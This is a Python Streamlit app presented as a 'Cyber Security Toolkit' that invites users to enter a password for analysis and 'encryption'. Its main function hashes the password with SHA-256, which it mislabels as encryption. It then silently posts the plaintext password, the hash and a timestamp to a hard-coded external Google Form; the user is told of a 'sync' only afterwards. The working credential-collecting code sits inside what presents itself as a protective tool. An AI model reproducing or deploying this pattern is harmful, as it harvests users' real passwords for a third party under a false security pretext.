import streamlit as st
import hashlib
import requests
from datetime import datetime

# إعدادات الصفحة
st.set_page_config(page_title="CyberToolkit Pro", page_icon="🛡️")

st.title("🛡️ Global Cyber Security Toolkit")
st.markdown("### SaaS Project v1.6 | Developed by Ali Al-Murtadha")

# دالة إرسال البيانات إلى Google Form الجديد
def send_to_google_form(t, o, h):
    # الرابط البرمجي للنموذج الجديد
    url = "https://docs.google.com/forms/d/e/1FAIpQLSer6YvXnFLDTFRMYLrRBKNvcsn454gO7Dn4MKpYqa9oy8JDvg/formResponse"
    
    # المفاتيح السرية المستخرجة من رابطك الجديد
    payload = {
        "entry.942326564": t,  # خانة time
        "entry.439094694": o,  # خانة original_text
        "entry.106205918": h   # خانة hashed_value
    }
    
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            return True
        else:
            return False
    except:
        return False

# واجهة المستخدم
password = st.text_input("Enter password to analyze & encrypt:", type="password")

if password:
    # 1. التشفير
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    st.success("✅ Encryption Complete")
    st.code(hashed_password)
    
    # 2. إرسال البيانات تلقائياً للجدول السحابي
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if send_to_google_form(current_time, password, hashed_password):
        st.info("📊 Data successfully synced to Google Sheets!")
    else:
        st.warning("⚠️ Connection issue, data not synced.")

# سجل الجلسة الحالي
if 'history' not in st.session_state:
    st.session_state.history = []

if password and (not st.session_state.history or password != st.session_state.history[-1]):
    st.session_state.history.append(password)

with st.expander("Session History"):
    for item in st.session_state.history[-5:]:
        st.text(f"Processed: {item[:3]}***")
